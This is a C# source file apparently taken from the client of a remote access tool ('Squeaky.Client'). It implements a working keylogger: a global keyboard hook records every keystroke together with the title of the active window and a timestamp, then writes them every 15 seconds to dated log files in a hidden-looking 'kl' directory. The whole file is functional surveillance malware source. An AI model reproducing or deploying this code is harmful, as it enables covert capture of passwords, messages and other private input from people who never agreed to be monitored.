using Gma.System.MouseKeyHook;
using System.Windows.Forms;
using System.Collections.Generic;
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.IO;
using System.Globalization;

namespace Squeaky.Client.Utilities
{
    class KeyLogger
    {
        public static List<Keys> PressedKeys = new List<Keys>();
        private static StringBuilder LogBuffer = new StringBuilder();
        private static string LastWindowTitle = "";

        private static bool FirstLine = true;

        private static string LogDir = @"kl\";

        private static void WriteLoop()
        {
            while (true)
            {
                var dateFile = DateTime.Now.ToString("M-d-yyyy") + ".log";

                foreach (string file in Directory.GetFiles(LogDir))
                {
                    if (file == LogDir + dateFile)
                    {
                        FirstLine = false;
                    }
                }

                if (LogBuffer.Length != 0)
                {
                    using (StreamWriter sw = File.AppendText($"{LogDir}{dateFile}"))
                    {
                        sw.Write(LogBuffer);
                        LogBuffer.Clear();
                    }
                }

                Thread.Sleep(15000);
            }
        }

        private static void OnKeyDown(object sender, KeyEventArgs e)
        {
            var activewindowtitle = KeyLoggerHelper.GetForegroundWindowTitle();
            if (!string.IsNullOrEmpty(activewindowtitle) && activewindowtitle != LastWindowTitle)
            {
                LastWindowTitle = activewindowtitle;
                LogBuffer.Append($"{(FirstLine ? "" : "\n\n")}[{activewindowtitle}] [{DateTime.Now.ToString("hh:mm:ss")}]\n");
            }

            if (!KeyLoggerHelper.IsExcludedKey(e.KeyCode) && !PressedKeys.Contains(e.KeyCode))
            {
                PressedKeys.Add(e.KeyCode);
                LogBuffer.Append($"[{e.KeyCode.ToString()}]");
            }
        }

        private static void OnKeyUp(object sender, KeyEventArgs e)
        {
            PressedKeys.Remove(e.KeyCode);
        }

        private static void OnKeyPress(object sender, KeyPressEventArgs e)
        {
            if (!KeyLoggerHelper.IsSpecialKey(e.KeyChar))
            {
                LogBuffer.Append(e.KeyChar);
            }
        }

        public static void Start()
        {
            var hook = Hook.GlobalEvents();
            hook.KeyDown += OnKeyDown;
            hook.KeyUp += OnKeyUp;
            hook.KeyPress += OnKeyPress;

            if (!Directory.Exists(LogDir)) Directory.CreateDirectory(LogDir);

            Thread WriteLoopThread = new Thread(WriteLoop);
            WriteLoopThread.Start();

            Application.Run();
        }
    }

    class KeyLoggerHelper
    {
        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll")]
        internal static extern IntPtr GetForegroundWindow();

        public static string GetForegroundWindowTitle()
        {
            StringBuilder sbTitle = new StringBuilder(1024);

            KeyLoggerHelper.GetWindowText(KeyLoggerHelper.GetForegroundWindow(), sbTitle, sbTitle.Capacity);

            return sbTitle.ToString();
        }

        public static bool IsExcludedKey(Keys k)
        {
            return (k >= Keys.A && k <= Keys.Z
                    || k >= Keys.NumPad0 && k <= Keys.Divide
                    || k >= Keys.D0 && k <= Keys.D9
                    || k >= Keys.Oem1 && k <= Keys.OemClear
                    || k >= Keys.LShiftKey && k <= Keys.RShiftKey
                    || k == Keys.CapsLock
                    || k == Keys.Space);
        }

        public static bool IsSpecialKey(char k)
        {
            var kStr = k.ToString();
            return (kStr == "\b"
                    || kStr == "\n"
                    || kStr == "\r"
                    || kStr == "\t"
                    || kStr == "\f"
                    || kStr == "\v");
        }
    }
}
